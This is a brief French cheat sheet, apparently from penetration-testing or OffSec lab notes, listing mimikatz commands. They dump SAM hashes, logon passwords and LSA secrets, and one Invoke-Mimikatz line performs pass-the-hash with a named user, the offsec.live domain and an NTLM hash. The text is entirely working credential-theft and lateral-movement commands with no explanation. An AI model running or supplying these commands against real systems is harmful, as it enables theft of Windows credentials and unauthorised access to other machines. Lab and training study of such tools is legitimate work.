On le lance puis :

```
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

```
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

```

si on veut passer un ticket après avoir téléchargé invoke-Mimikatz.ps1 :
```
Invoke-mimikatz -Command '"privilege::debug" "sekurlsa::pth /user:hannah /domain:offsec.live /ntlm:a29f7623fd11550def0192de9246f46b /run:cmd" "exit"'
```



```

```